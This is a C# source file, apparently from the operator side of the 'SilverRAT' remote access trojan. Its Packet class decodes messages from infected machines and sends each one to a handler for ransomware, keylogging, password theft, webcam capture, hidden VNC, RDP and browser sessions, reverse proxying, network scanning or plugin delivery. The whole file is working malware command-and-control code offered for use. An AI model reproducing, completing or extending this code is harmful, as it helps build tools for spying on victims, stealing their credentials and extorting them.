using SilverRAT.Connection;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using SilverRAT.Properties;
using SilverRAT.SilverRAT.Handle_Packet;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

public class Packet
{
    public Clients client;

    public byte[] data;

    public void Read(object o)
    {
        try
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes(data);
            Program.Silver.Invoke((MethodInvoker)delegate
            {
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "HiddenApps":
                        new HandleHApps().Connect(client, unpack_msgpack);
                        break;
                    case "OptionsForm":
                        new HandleOptions().Connect(client, unpack_msgpack);
                        break;
                    case "chat-":
                        new HandleChat().GetClient(unpack_msgpack, client);
                        break;
                    case "Reverse-Proxy":
                        new HandleReverseProxy().Connect(client, unpack_msgpack);
                        break;
                    case "socketDownload":
                        new HandleManager().SocketDownload(client, unpack_msgpack);
                        break;
                    case "reportWindow-Stop":
                        Notifiecation.Show("Monitor", "The observer is turned OFF : " + client.Ip + " ", Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
                        break;
                    case "Hidden-VNC":
                        new HandleHiddenVNC().Connect(client, unpack_msgpack);
                        break;
                    case "sendPlugin":
                        Notifiecation.Show("Info", "Sending the plugin to client " + client.Ip + " for the first time please wait..", Resources.InfoNotif, Color.FromArgb(52, 152, 219));
                        new HandleLogs().Addmsg("Sending the plugin to client " + client.Ip + " for the first time please wait..", Color.FromArgb(52, 152, 219), Methods.Info);
                        ThreadPool.QueueUserWorkItem(delegate
                        {
                            client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString);
                        });
                        break;
                    case "Success":
                        Notifiecation.Show("Success", client.Ip + " : " + unpack_msgpack.ForcePathObject("Success").AsString, Resources.SuccessNotif, Color.FromArgb(103, 185, 108));
                        new HandleLogs().Addmsg(client.Ip + " : " + unpack_msgpack.ForcePathObject("Success").AsString, Color.FromArgb(103, 185, 108), Methods.Success);
                        break;
                    case "reportWindow":
                        new HandelListMonitor(client, unpack_msgpack.ForcePathObject("Title").AsString, unpack_msgpack.ForcePathObject("Mesg").AsString);
                        break;
                    case "Ping":
                        new HandlePing().Ping(client, unpack_msgpack);
                        break;
                    case "pong":
                        new HandlePing().Pong(client, unpack_msgpack);
                        break;
                    case "chat":
                        new HandleChat().Read(unpack_msgpack, client);
                        break;
                    case "Info":
                        new HandleLogs().Addmsg(client.Ip + " : " + unpack_msgpack.ForcePathObject("Info").AsString, Color.FromArgb(52, 152, 219), Methods.Info);
                        break;
                    case "Ransom":
                        new HandleRansomware().Connect(client, unpack_msgpack);
                        break;
                    case "reportWindow-":
                        {
                            if (Settings.ReportWindow)
                            {
                                lock (Settings.LockReportWindowClients)
                                {
                                    Settings.ReportWindowClients.Add(client);
                                    break;
                                }
                            }
                            MsgPack msgPack = new MsgPack();
                            msgPack.ForcePathObject("Packet").AsString = "reportWindow";
                            msgPack.ForcePathObject("Option").AsString = "stop";
                            ThreadPool.QueueUserWorkItem(client.Send, msgPack.Encode2Bytes());
                            Notifiecation.Show("Monitor", "The observer is turned on : " + client.Ip + " ", Resources.InfoNotif, Color.FromArgb(52, 152, 219));
                            break;
                        }
                    case "Keyloagger":
                        new HandleKeyloaggar().Connect(client, unpack_msgpack);
                        break;
                    case "ClientInfo":
                        ThreadPool.QueueUserWorkItem(delegate
                        {
                            new HandleListView().AddToListview(client, unpack_msgpack);
                        });
                        break;
                    case "RDP":
                        new HandleRemoteDesktop().Connect(client, unpack_msgpack);
                        break;
                    case "RAPP":
                        new HandleRemoteAPP().Connect(client, unpack_msgpack);
                        break;
                    case "Passwords":
                        new HandlePasswords().Connect(client, unpack_msgpack);
                        break;
                    case "Camera":
                        new HandleCamera().Connect(client, unpack_msgpack);
                        break;
                    case "HVNC":
                        new HandleHiddenVNC().Connect(client, unpack_msgpack);
                        break;
                    case "HRDP":
                        new HandleHiddenRDP().Connect(client, unpack_msgpack);
                        break;
                    case "HBrowser":
                        new HandleHiddenBrowser().Connect(client, unpack_msgpack);
                        break;
                    case "ScanNET":
                        new HandleScanNET().Connect(client, unpack_msgpack);
                        break;
                    case "Error":
                        Notifiecation.Show("Error!", client.Ip + " : " + unpack_msgpack.ForcePathObject("Error").AsString, Resources.ErrorNotif, Color.FromArgb(204, 102, 90));
                        new HandleLogs().Addmsg(client.Ip + " : " + unpack_msgpack.ForcePathObject("Error").AsString, Color.FromArgb(204, 102, 90), Methods.Error);
                        break;
                    case "Manager":
                        new HandleManager().Connect(client, unpack_msgpack);
                        break;
                }
            });
        }
        catch
        {
        }
    }

    public static string GetUserIDClient(DataGridViewRow DGV)
    {
        if (DGV != null)
        {
            return DGV.Cells[1].Value.ToString() + "\\" + DGV.Cells[2].Value.ToString() + "\\" + DGV.Cells[9].Value.ToString() + "\\" + DGV.Cells[9].Value.ToString();
        }
        return "";
    }
}
